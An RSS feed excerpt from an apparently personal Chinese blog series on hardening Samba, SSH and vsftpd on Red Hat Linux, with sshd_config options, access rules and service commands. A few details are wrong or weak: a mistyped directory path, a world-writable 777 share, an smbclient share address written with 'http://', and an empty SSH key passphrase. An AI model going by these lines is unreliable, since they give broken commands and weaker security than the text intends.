<p><img src="/assets/liunx-samba-6.png" alt="SAMBA 服务安全配置"></p>
<h3 id="创建共享目录-设置权限" tabindex="-1"> 创建共享目录, 设置权限</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>mkdir</span> /hoem/test
<span>chmod</span> <span>777</span> /home/test
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><div><p>注意</p>
<p>共享目录一定要有执行权限, 一般 <code>755</code> 就够了, 这里设置 <code>777</code> 就是权限大一点就是了。</p>
</div>
<p><img src="/assets/liunx-samba-7.png" alt="SAMBA 服务安全配置"></p>
<h3 id="添加-samba-用户" tabindex="-1"> 添加 SAMBA 用户</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>useradd</span> zc
<span>useradd</span> sx
smbpasswd -a zc
smbpasswd -a sx
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>
<p>这里需要注意的是, 要使用 <code>smbpasswd -a</code> 创建用户, 因为之前设置了用户密码的存储方式为 <code>tdbsam</code> 。</p>
</div>
<p><img src="/assets/liunx-samba-8.png" alt="SAMBA 服务安全配置"></p>
<h3 id="使用-windows-访问" tabindex="-1"> 使用 windows 访问</h3>
<p><code>For Example:</code> <br></p>
<p><img src="/assets/liunx-samba-9.png" alt="SAMBA 服务安全配置"></p>
<p>输入用户名和密码, 就可以愉快的进行测试了, 这里就不多说了。</p>
<h3 id="使用-smbclient-访问" tabindex="-1"> 使用 smbclient 访问</h3>
<h4 id="列出共享文件夹" tabindex="-1"> 列出共享文件夹</h4>
<p>列出某个 IP 地址所提供的共享文件夹</p>
<p><code>Connect Format:</code></p>
<div><pre><code>smbclient -L <span>[</span>ip<span>]</span> -U <span>[</span>userName<span>]</span>%<span>[</span>password<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="像-ftp-客户端一样使用-smbclient" tabindex="-1"> 像 FTP 客户端一样使用 smbclient</h4>
<div><p>提示</p>
<p>执行 smbclient 命令成功后, 进入 smbclient 环境, 出现提示符: <code>smb:\&gt;</code> 这里有许多命令和 ftp 命令相似, 如 <code>cd</code> 、 <code>lcd</code> 、 <code>get</code> 、 <code>megt</code> 、 <code>put</code> 、 <code>mput</code> 等。通过这些命令, 我们可以访问远程主机的共享资源。</p>
</div>
<p><code>Connect Format:</code></p>
<div><pre><code>smbclient http://<span>[</span>ip<span>]</span>/<span>[</span>shareFolder<span>]</span> -U <span>[</span>username<span>]</span>%<span>[</span>password<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-samba-1.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 服务配置笔记（二）SSH 服务安全配置</title>
      <link>https://vxhly.github.io/views/liunx/liunx-service-ssh.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-service-ssh.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 服务配置笔记（二）SSH 服务安全配置</source>
      <description>前言
本篇是 Liunx 的服务配置笔记系列第二篇, 这一篇将具体介绍 Red Hat Liunx 下 SSH 服务的安全配置。所谓 SSH 就是加密的数据传输, 但是使用其的默认配置并不是安全的, 所以还需要对其进行详细的配置。

</description>
      <category>liunx</category>
      <pubDate>Fri, 16 Sep 2016 11:59:15 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的服务配置笔记系列第二篇, 这一篇将具体介绍 Red Hat Liunx 下 SSH 服务的安全配置。所谓 SSH 就是加密的数据传输, 但是使用其的默认配置并不是安全的, 所以还需要对其进行详细的配置。</p>
</div>

<h2 id="配置文件的位置" tabindex="-1"> 配置文件的位置</h2>
<p>主配置文件: <strong>/etc/ssh/sshd_config</strong></p>
<h2 id="服务的启动与停止" tabindex="-1"> 服务的启动与停止</h2>
<div><p>提示</p>
<p>SSH 的服务名并不叫做 <code>ssh</code> , 而是 <code>sshd</code> 。<br> 修改配置文件过后一定要重启 <code>sshd</code> 服务。</p>
</div>
<div><pre><code><span>service</span> sshd status        <span># 状态</span>
<span>service</span> sshd start         <span># 启动</span>
<span>service</span> sshd stop          <span># 暂停</span>
<span>service</span> sshd restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h2 id="安全配置" tabindex="-1"> 安全配置</h2>
<h3 id="修改端口号" tabindex="-1"> 修改端口号</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span># Port 22</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>配置文件中将其注释掉, 则采用默认的端口 22, 我们可以修改它。去掉 # , 修改成我们想要的端口号。</p>
</div>
<p><code>Example Configuration:</code> <br></p>
<p><img src="/assets/liunx-ssh-1.png" alt="SSH 服务安全配置"></p>
<h4 id="使用客户端进行验证" tabindex="-1"> 使用客户端进行验证</h4>
<div><p>提示</p>
<p>验证之前, 请重启服务。默认是允许 root 用户登录的, 以下测试例子是使用 root 用户登录的。</p>
</div>
<p>使用默认端口连接, <code>Connection Format:</code></p>
<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>host <span>|</span> ip<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>若端口不对则会显示</p>
<div><pre><code>ssh: connect to <span>host</span> <span>[</span>host <span>|</span> ip<span>]</span> <span>[</span>port<span>]</span> <span>22</span>: Connection refused
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>Example Connection:</code> <br></p>
<p><img src="/assets/liunx-ssh-2.png" alt="SSH 服务安全配置"></p>
<p>使用配置端口连接, <code>Connection Format:</code></p>
<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>host <span>|</span> ip<span>]</span> -p <span>[</span>port<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>连接成功则会显示</p>
<div><pre><code>Last login: <span>[</span>date<span>]</span> from <span>[</span>host <span>|</span> ip<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>Example Connection:</code> <br></p>
<p><img src="/assets/liunx-ssh-3.png" alt="SSH 服务安全配置"></p>
<h3 id="禁止-root-用户登录" tabindex="-1"> 禁止 root 用户登录</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span># PermitRootLogin yes</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认情况下是允许 root 用户登录的, 是十分不安全, 毕竟 root 用户权限太大了。我们可以去除 #, 将 yes 修改成 no, 这就禁止了 root 用户登录。</p>
<p><code>Example Configuration:</code></p>
<div><pre><code>PermitRootLogin no
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ssh-4.png" alt="SSH 服务安全配置"></p>
<h4 id="使用客户端进行验证-1" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。我们已经禁止 root 用户登录了, 以下测试例子仍然使用 root 用户进行验证。</p>
<p>由于之前配置过端口号, 这时候就要使用配置的端口号了, <code>Connection Format:</code></p>
<div><pre><code><span>ssh</span> root@<span>[</span>host <span>|</span> ip<span>]</span> -p <span>[</span>port<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>使用 <code>exit</code> 可以退出当前的连接, 退出成功将会显示</p>
<div><pre><code>Connection to <span>[</span>host <span>|</span> ip<span>]</span> closed
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>Example Connection:</code> <br></p>
<p><img src="/assets/liunx-ssh-5.png" alt="SSH 服务安全配置"></p>
<h3 id="禁止空密码登录" tabindex="-1"> 禁止空密码登录</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span># PermitEmptyPasswords no</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认情况下, SSH 已经禁止了使用空密码登录系统, 即使配置文件中将其注释掉。如果被设置成 yes, 则就是不安全的, 我们可以修改成 no。</p>
<p><code>Example Configuration:</code></p>
<div><pre><code>PermitEmptyPasswords no
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ssh-6.png" alt="SSH 服务安全配置"></p>
<h4 id="使用客户端进行验证-2" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。我们已经禁止 root 用户登录了, 以下测试我们将使用普通用户。注意: 使用普通用户之前, 先确保服务端是有该用户的。</p>
<p>由于之前配置过端口号, 这时候就要使用配置的端口号了, <code>Connection Format:</code></p>
<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>host <span>|</span> ip<span>]</span> -p <span>[</span>port<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>如果是第一次连接的话, 会提示是否保存密钥信息, 输入 <code>yes</code> 就好。</p>
<p><code>Example Connection:</code> <br></p>
<p><img src="/assets/liunx-ssh-7.png" alt="SSH 服务安全配置"></p>
<p>断开连接, 我们尝试使用空密码连接, 只需回车就好</p>
<p><code>Example Connection:</code> <br></p>
<p><img src="/assets/liunx-ssh-8.png" alt="SSH 服务安全配置"></p>
<h3 id="设置必需使用密码登录" tabindex="-1"> 设置必需使用密码登录</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span># PasswordAuthentication yes</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认的配置就是需要使用密码登录的, 即使它是注释的。若遇到配置值为 no 的, 一定要修改成 yes。</p>
<p><code>Example Configuration:</code></p>
<div><pre><code>PasswordAuthentication <span>yes</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="使用客户端进行验证-3" tabindex="-1"> 使用客户端进行验证</h4>
<p>前面已经验证过了, 这里不再重复</p>
<h3 id="设置仅允许密钥登录" tabindex="-1"> 设置仅允许密钥登录</h3>
<div><p>注意</p>
<p>密钥登录是与密码登录是不一样的。只允许密钥登录的时候必须要把允许密码登录的选项禁用。</p>
</div>
<p><code>For Example:</code></p>
<div><pre><code>PasswordAuthentication no
</code></pre><div aria-hidden="true"><div></div></div></div><p>接下来就是将下图所示的注释去掉, 就好了<br></p>
<h4 id="免密码登录" tabindex="-1"> 免密码登录</h4>
<p>主机生成密钥对（包含公钥和私钥）</p>
<div><pre><code>ssh-keygen -t rsa -P <span>""</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>把本地主机的公钥复制到远程主机的 <code>authorized_keys</code> 文件上</p>
<div><pre><code>ssh-copy-id <span>[</span>user<span>]</span>@<span>[</span>server<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="限制登录失败之后重试次数" tabindex="-1"> 限制登录失败之后重试次数</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span># MaxAuthTries 6</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认情况下可以重试 6 次, 如果你觉得这个不合理, 当然可以修改它。同理将 # 去除, 将 6 修改成我们想要的次数。</p>
<p><code>Example Configuration:</code></p>
<div><pre><code>MaxAuthTries <span>3</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ssh-9.png" alt="SSH 服务安全配置"></p>
<h4 id="使用客户端进行验证-4" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。之前我们在服务器上新建了一个用户, 那么我们将用这个用户进行连接。</p>
<p>当我们输入错误的密码时, 则会显示</p>
<div><pre><code>Permission denied, please try again.
</code></pre><div aria-hidden="true"><div></div></div></div><p>当我们最后一次输入错误的密码时, 则会显示</p>
<div><pre><code>Permission denied <span>(</span>publickey,gssapi-with-mic,password<span>)</span>.
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>Example Connection:</code> <br></p>
<p><img src="/assets/liunx-ssh-10.png" alt="SSH 服务安全配置"></p>
<h3 id="设置多长时间没有成功连接上-就断线" tabindex="-1"> 设置多长时间没有成功连接上, 就断线</h3>
<p><code>Default Configuration:</code></p>
<div><pre><code><span># LoginGraceTime 2m</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>默认的等待时间为 2 分钟, 如果没有单位将以秒作为单位, 可用的单位分别为 h, m、s。我们可以根据需求修改, 当然是越短越安全。</p>
<p><code>Example Configuration:</code></p>
<div><pre><code>LoginGraceTime 10s
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-ssh-11.png" alt="SSH 服务安全配置"></p>
<h4 id="使用客户端进行验证-5" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。之前我们在服务器上新建了一个用户, 那么我们仍然使用用这个用户进行连接。</p>
<p>我们可以输入一个错误的密码, 在等待一段时间, 按下回车, 则会显示</p>
<div><pre><code>Connection closed by <span>[</span>host <span>|</span> ip<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>Example Connection:</code> <br></p>
<p><img src="/assets/liunx-ssh-12.png" alt="SSH 服务安全配置"></p>
<h3 id="设置白名单和黑名单" tabindex="-1"> 设置白名单和黑名单</h3>
<p>默认配置中是没有白名单和黑名单这个选项的, 我们可以自己添加上去。多个用户之间必须使用空格分割。同理, 用户组也一样。</p>
<p><code>白名单</code></p>
<div><pre><code>AllowUsers <span>[</span>userName<span>]</span><span>1</span> <span>[</span>userName<span>]</span><span>2</span> <span>..</span>.
AllowGroups groupName1 groupName2 <span>..</span>.
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><code>黑名单</code></p>
<div><pre><code>DenyUsers <span>[</span>userName<span>]</span><span>1</span> <span>[</span>userName<span>]</span><span>2</span> <span>..</span>.
DenyGroups groupName1 groupName2 <span>..</span>.
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><code>Example Configuration:</code> <br></p>
<p><img src="/assets/liunx-ssh-13.png" alt="SSH 服务安全配置"></p>
<h4 id="使用客户端进行验证-6" tabindex="-1"> 使用客户端进行验证</h4>
<p>验证之前, 请重启服务。由于白名单与黑名单效果是一致的, 这里只提供白名单的验证测试。注意: 服务器上依然需要新建测试用户（包含设置密码, 否则, 不能登录）。</p>
<p>这时候, 我们就需要输入正确的密码。</p>
<p><code>Example Connection:</code> <br></p>
<p><img src="/assets/liunx-ssh-14.png" alt="SSH 服务安全配置"></p>
<h3 id="限制-ip-登录" tabindex="-1"> 限制 IP 登录</h3>
<h4 id="方法一" tabindex="-1"> 方法一</h4>
<p>在 <code>/etc/hosts.allow</code> 中添加 SSH 登录的 ip 或者网段, <code>For Example:</code></p>
<div><pre><code>sshd:192.168.1.2:allow        <span># ip 地址</span>
sshd:192.168.1.0/24:allow     <span># 网段</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>在 <code>/etc/hosts.deny</code> 中添加不允许 SSH 登录的 IP, <code>For Example:</code></p>
<div><pre><code>sshd:ALL                      <span># ALL 表示除了上面允许的,其他的 ip 都拒绝登录</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="方法二" tabindex="-1"> 方法二</h4>
<p>使用 <code>iptables</code> , <code>For Example:</code></p>
<div><pre><code>iptables -A INPUT -p tcp -s <span>192.168</span>.1.2 --destination-port <span>22</span> -j ACCEPT
iptables -A INPUT -p tcp --destination-port <span>22</span> -j DROP
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h4 id="方法三" tabindex="-1"> 方法三</h4>
<p>修改 sshd 主配置文件 <code>/etc/ssh/sshd_config</code> , <code>For Example:</code></p>
<div><pre><code>AllowUsers test@192.168.1.2
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-ssh-1.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 服务配置笔记（一）概述</title>
      <link>https://vxhly.github.io/views/liunx/liunx-service.html</link>
      <guid>https://vxhly.github.io/views/liunx/liunx-service.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 服务配置笔记（一）概述</source>
      <description>前言
Liunx 的学习笔记已经推出有一段时间了, 现继续推出在 Liunx 中 SAMBA 服务、SSH 服务、FTP 服务、APACHE 服务、DNS 服务的安全配置。本文就先介绍这几个服务的相关内容。

</description>
      <category>liunx</category>
      <pubDate>Thu, 15 Sep 2016 18:59:15 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Liunx 的学习笔记已经推出有一段时间了, 现继续推出在 Liunx 中 SAMBA 服务、SSH 服务、FTP 服务、APACHE 服务、DNS 服务的安全配置。本文就先介绍这几个服务的相关内容。</p>
</div>

<h2 id="samba-服务" tabindex="-1"> SAMBA 服务</h2>
<p>即 Windows 下的共享, SAMBA 服务只不过是将 Liunx 下的文件共享给 Windows。</p>
<h3 id="使用到的端口号" tabindex="-1"> 使用到的端口号</h3>
<ul>
<li>NetBIOS 名字服务（默认为 <code>137</code> 端口(UDP)）</li>
<li>NetBIOS 数据报服务（默认为 <code>138</code> 端口(UDP)）</li>
<li>文件和打印共享（默认为 <code>139</code> 端口(TCP)）</li>
<li>NetBIOS 服务在 windos 2000 及以后版本使用此端口（默认为 <code>445</code> 端口(TCP)）</li>
</ul>
<h3 id="所需软件" tabindex="-1"> 所需软件</h3>
<ul>
<li><strong>samba</strong></li>
</ul>
<p>-- 这个软件主要包含了 SAMBA 的主要 daemon 文件（smbd 及 nmbd）、SAMBA 的文件（document）与 SAMBA 相关的 logrotate 设置文件及开机默认选项文件等。</p>
<ul>
<li><strong>samba-common</strong></li>
</ul>
<p>-- 这个软件主要提供了 SAMBA 的主要配置文件（smb.conf）、smb.conf 语法检验的测试程序（testparm）等</p>
<ul>
<li><strong>samba-client</strong></li>
</ul>
<p>-- 这个软件提供了当 Liunx 作为 SAMBA 客户端时, 所需的工具指令, 例如挂载 SAMBA 文件格式的执行文件 smbmount 等</p>
<h3 id="主配置文件" tabindex="-1"> 主配置文件</h3>
<ul>
<li><strong>/etc/samba/smb.conf</strong></li>
</ul>
<p>-- 是 SAMBA 的主要配置文件, 基本上, SAMBA 就仅有这个配置文件而已, 且这个配置文件本身就是很详细的说明文件, 这个文件主要在设置工作组、NetBIOS 名称以及共享目录等。</p>
<h3 id="查看主配置文件的帮助" tabindex="-1"> 查看主配置文件的帮助</h3>
<div><pre><code><span>man</span> <span>5</span> smb.conf
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="重要选项说明" tabindex="-1"> 重要选项说明</h3>
<h4 id="全局选项" tabindex="-1"> 全局选项</h4>
<ul>
<li><strong>workgroup = [MYGROUP]</strong></li>
</ul>
<p>-- 定义 samba 服务器所在的工作组或者域（如果设置 <code>security = domain</code> 的话）。</p>
<ul>
<li><strong>server string = [Samba server]</strong></li>
</ul>
<p>-- 设定 samba 服务器的描述, 通过网络邻居访问时可在备注中查看到该描述信息。</p>
<ul>
<li><strong>netbios name = [MyServer]</strong></li>
</ul>
<p>-- 主机 NetBIOS 名称, 每台机子皆不同</p>
<ul>
<li><strong>security = share/user/server/domain/ads</strong></li>
</ul>
<p>-- <strong>share</strong>: 访问 Samba 服务器共享资源时不需要输入用户名和密码, 属于匿名访问。 -- <strong>user</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码, 认证用户来源为 Samba 服务器本机。 -- <strong>server</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码, 认证用户来源为另一台 Samba 服务器或 Windows 服务器。 -- <strong>domain</strong>: Samba 服务器在一个基于 Windows NT 平台的 Windows 域中, 访问共享资源需要输入用户名和密码, 认证用户来源为 Windows 域。 -- <strong>ads</strong>: Samba 服务器在一个基于 Windows 200X 平台的 Windows 活动目录中, 访问共享资源需要输入用户名和密码, 认证用户来源为 Windows 活动目录。</p>
<ul>
<li><strong>encrypt passwords = yes | no</strong></li>
</ul>
<p>-- 设定是否对密码进行加密。如果不对密码进行加密的话, 在认证会话期间, 客户端与服务器传递的是明文密码。</p>
<ul>
<li><strong>passdb backend = tdbsam/smbpasswd/ldapsam/mysql</strong></li>
</ul>
<p>-- <strong>tdbsam</strong>: 该方式使用一个数据库文件来建立用户数据库, 数据库文件名为 passdb.tdb 。可以使用 <code>smbpasswd -a [userName]</code> 来建立 Samba 用户。也可以使用 <code>pdbedit</code> 命令来建立用户。 -- <strong>smbpasswd</strong>: 该方式使用 Samba 提供的工具 smbpasswd 来给系统用户设置一个用于访问 Samba 服务的密码, 客户端就用这个密码访问 Samba 共享资源。此方式还要使用一个 <code>smb passwd file = /usr/local/samba/etc/smbpasswd</code> （或 <code>/etc/samba/smbpasswd</code> ） 参数来指定保存用户名和密码的文件, 该文件需要手动建立。不推荐使用此方法。 -- <strong>ldapsam</strong>: 该方式基于 LADP 的账户管理方式来验证用户, 先要建立 LDAP 服务。 -- <strong>mysql</strong>: 该方式是将 Samba 服务器的用户名和密码存储到 MySQL 数据库中。</p>
<h4 id="局部设置" tabindex="-1"> 局部设置</h4>
<ul>
<li><strong>comment = [comment]</strong></li>
</ul>
<p>-- 设定共享服务的描述信息。</p>
<ul>
<li><strong>path = [path]</strong></li>
</ul>
<p>-- 设定共享服务的路径。</p>
<ul>
<li><strong>read only = yes | no</strong></li>
</ul>
<p>-- 设定该共享服务是否为只读, 该选项有一个同义选项 <code>writeable</code> 。</p>
<ul>
<li><strong>user = <a href="@%5BgroupName%5D">userName</a></strong></li>
</ul>
<p>-- 设定所有可能使用该共享服务的用户, 可以使用 <code>@group</code> 来设置群组 group 中的所有用户账号。该选项的值为列表, 不同的项目之间使用空格或逗号隔开。在设置 <code>security = share</code> 时, 客户端要访问某共享服务时提供的密码会与该选项指定的所有用户进行一一配对认证, 若某用户认证通过, 则以该用户权限进行共享服务访问, 否则拒绝客户端的访问（设置 <code>security = share</code> 不是允许游客访问, 只有 <code>guest ok = yes</code> 才是允许游客访问, 切记！！！）。</p>
<ul>
<li><strong>valid users = <a href="@%5BgroupName%5D">userName</a></strong></li>
</ul>
<p>-- 设定能够使用该共享服务的用户和组, 其值的格式与 user 选项一样。</p>
<ul>
<li><strong>invalid users = <a href="@%5BgroupName%5D">userName</a></strong></li>
</ul>
<p>-- 设定不能够使用该共享服务的用户和组, 其值的格式与 user 选项一样。</p>
<ul>
<li><strong>invalid users = <a href="@%5BgroupName%5D">userName</a></strong></li>
</ul>
<p>-- 设定不能够使用该共享服务的用户和组, 其值的格式与 user 选项一样。</p>
<ul>
<li><strong>read list = <a href="@%5BgroupName%5D">userName</a></strong></li>
</ul>
<p>-- 设定对该共享服务只有读取权限的用户和组, 其值的格式与 user 选项一样。</p>
<ul>
<li><strong>write list = <a href="@%5BgroupName%5D">userName</a></strong></li>
</ul>
<p>-- 设定对该共享服务拥有读写权限的用户和组, 其值的格式与 user 选项一样。</p>
<ul>
<li><strong>admin list = <a href="@%5BgroupName%5D">userName</a></strong></li>
</ul>
<p>-- 设定对该共享服务拥有管理权限的用户和组, 其值的格式与 user 选项一样。</p>
<ul>
<li><strong>public = yes | no</strong></li>
</ul>
<p>-- 设定该共享服务是否能够被游客访问, 其同义选项有 guest ok。</p>
<ul>
<li><strong>create mode = mode</strong></li>
</ul>
<p>-- mode 为八进制值, 如 0755, 其默认值为 0744。该选项指定的值用于过滤新建文件的访问权限, 新建文件的默认权限将与 create mode 指定的值进行按位与操作, 将结果再与 force create mode 指定的值进行按位或操作, 得到的结果即为新建文件的访问权限。</p>
<h3 id="服务的启动与停止" tabindex="-1"> 服务的启动与停止</h3>
<p>SAMBA 的服务名并不叫做 <code>samba</code> , 而是 <code>smb</code> 。</p>
<div><pre><code><span>service</span> smb status        <span># 状态</span>
<span>service</span> smb start         <span># 启动</span>
<span>service</span> smb stop          <span># 暂停</span>
<span>service</span> smb restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="设置开机自启" tabindex="-1"> 设置开机自启</h3>
<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> smb   <span># 查看自启状态</span>
<span>chkconfig</span> --level <span>35</span> smb on   <span># 设置开机自启</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="ssh-服务" tabindex="-1"> SSH 服务</h2>
<p>更安全的远程连接, 它通过对联机数据包加密的技术来进行数据传输, 因此, 数据就更安全了。</p>
<h3 id="使用到的端口号-1" tabindex="-1"> 使用到的端口号</h3>
<ul>
<li>安全的数据传输（默认为 <strong><code>22</code></strong> 端口）</li>
</ul>
<h3 id="所需软件-1" tabindex="-1"> 所需软件</h3>
<p>一般情况下, RedHat 已经预装了 openssh, 所以这里不做过多的阐述了</p>
<h3 id="主配置文件-1" tabindex="-1"> 主配置文件</h3>
<ul>
<li><strong>/etc/ssh/sshd_config</strong></li>
</ul>
<p>-- <strong>sshd_config</strong> 是 SSH 的主要配置文件, 基本上, SSH 相关的配置都放在这里, 这个文件的默认配置项已经很完美了, 事实上不需要过多的改动。</p>
<h3 id="查看主配置文件的帮助-1" tabindex="-1"> 查看主配置文件的帮助</h3>
<div><pre><code><span>man</span> <span>5</span> sshd_config
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="重要选项说明-1" tabindex="-1"> 重要选项说明</h3>
<h4 id="监听相关配置" tabindex="-1"> 监听相关配置</h4>
<ul>
<li><strong>Port 22</strong></li>
</ul>
<p>-- 设置连接到远程主机的端口, 可以进行修改</p>
<ul>
<li><strong>ListenAddress [192.168.1.1]</strong></li>
</ul>
<p>-- 设置 sshd 服务器绑定的 IP 地址</p>
<h4 id="密码、登录相关配置" tabindex="-1"> 密码、登录相关配置</h4>
<ul>
<li><strong>MaxAuthTries 3</strong></li>
</ul>
<p>-- 最大密码输入错误次数</p>
<ul>
<li><strong>PermitRootLogin no</strong></li>
</ul>
<p>-- 设置 root 能不能用 ssh 登录。这个选项一定不要设成 <code>“yes”</code></p>
<ul>
<li><strong>LoginGraceTime 600</strong></li>
</ul>
<p>-- 当用户连接上 SSH 时, 在输入密码界面, 设置在多长时间内没有成功连接 SSH , 就断线（若无单位默认以秒为单位）</p>
<ul>
<li><strong>PasswordAuthentication yes</strong></li>
</ul>
<p>-- 设置是否允许口令验证</p>
<ul>
<li><strong>PermitEmptyPasswords no</strong></li>
</ul>
<p>-- 设置是否允许用口令为空的帐号登录</p>
<h4 id="用户限制配置" tabindex="-1"> 用户限制配置</h4>
<ul>
<li><strong>AllowUsers [userName]</strong></li>
</ul>
<p>-- 设置白名单, 可以跟着任意的数量的用户名的匹配串（patterns）或 user@host 这样的匹配串, 这些字符串用空格隔开。</p>
<ul>
<li><strong>AllowGroups [groupName]</strong></li>
</ul>
<p>-- 设置白名单, 可以跟着任意的数量的组名的匹配串（patterns）或 user@host 这样的匹配串, 这些字符串用空格隔开。</p>
<ul>
<li><strong>DenyUsers [userName]</strong></li>
</ul>
<p>-- 设置黑名单, 与 <code>AllowUsers</code> 写法一致。</p>
<ul>
<li><strong>DenyGroups [groupName]</strong></li>
</ul>
<p>-- 设置黑名单, 与 <code>AllowGroups</code> 写法一致。</p>
<h3 id="服务的启动与停止-1" tabindex="-1"> 服务的启动与停止</h3>
<div><p>提示</p>
<p>SSh 的服务名并不叫做 <code>ssh</code> , 而是 <code>sshd</code> 。</p>
</div>
<div><pre><code><span>service</span> sshd status        <span># 状态</span>
<span>service</span> sshd start         <span># 启动</span>
<span>service</span> sshd stop          <span># 暂停</span>
<span>service</span> sshd restart       <span># 重启</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h4 id="设置开机自启-1" tabindex="-1"> 设置开机自启</h4>
<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> sshd   <span># 查看自启状态</span>
<span>chkconfig</span> --level <span>35</span> sshd on   <span># 设置开机自启</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="ftp-服务" tabindex="-1"> FTP 服务</h2>
<div><p>提示</p>
<p>确切的说, 应该叫它 vsFTP。vsFTP 是一个基于 GPL 发布的类 Unix 系统上使用的 FTP 服务器软件, 它的全称是 <code>Very Secure FTP</code></p>
</div>
<h3 id="使用到的端口号-2" tabindex="-1"> 使用到的端口号</h3>
<ul>
<li>命令通道的 FTP（默认为 <strong><code>21</code></strong> 端口）</li>
<li>数据传输的 FTP-data（默认为 <strong><code>20</code></strong> 端口）</li>
</ul>
<h3 id="所需软件-2" tabindex="-1"> 所需软件</h3>
<ul>
<li><strong>vsftpd</strong></li>
</ul>
<p>-- 这个软件主要包含了 vsFTP 的主要 daemon 文件。</p>
<h3 id="主要的配置文件" tabindex="-1"> 主要的配置文件</h3>
<ul>
<li><strong>/etc/vsftp/vsftpd.conf</strong></li>
</ul>
<p>-- 严格来说, 整个 vsFTP 的配置文件就只有这一个。这个配置文件的设置是以 bash 的变量相同的设置方式来处理的, 也就是 <code>“参数=设置值”</code> 来设置的, 注意, 等号两边不能有空格。</p>
<ul>
<li><strong>/etc/vsftpd/chroot_list</strong></li>
</ul>
<p>-- 用来限制用户只能在家目录的文件, 需要在主配置文件中进行配置, 默认没有这个文件, 需要手动创建, 如果文件名不同, 主配置文件也要对其相应的修改。</p>
<ul>
<li><strong>/etc/vsftpd/ftpusers</strong></li>
</ul>
<p>-- 黑名单列表, 就是用来规定哪些用户不能登录 FTP。</p>
<h3 id="查看主配置文件的帮助-2" tabindex="-1"> 查看主配置文件的帮助</h3>
<div><pre><code><span>man</span> <span>5</span> vsftpd.conf
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="重要选项说明-2" tabindex="-1"> 重要选项说明</h3>
<h4 id="全局设置" tabindex="-1"> 全局设置</h4>
<ul>
<li><strong>write_enable=YES/NO</strong></li>
</ul>
<p>-- 是否允许登陆用户有写权限。属于全局设置, 默认值为 YES。</p>
<ul>
<li><strong>data_connection_timeout=120</strong></li>
</ul>
<p>-- 设置建立 FTP 数据连接的超时时间, 单位为秒。默认值为 120。</p>
<ul>
<li><strong>idle_session_timeout=300</strong></li>
</ul>
<p>-- 设置多长时间不对 FTP 服务器进行任何操作, 则断开该 FTP 连接, 单位为秒。默认值为 300 。</p>
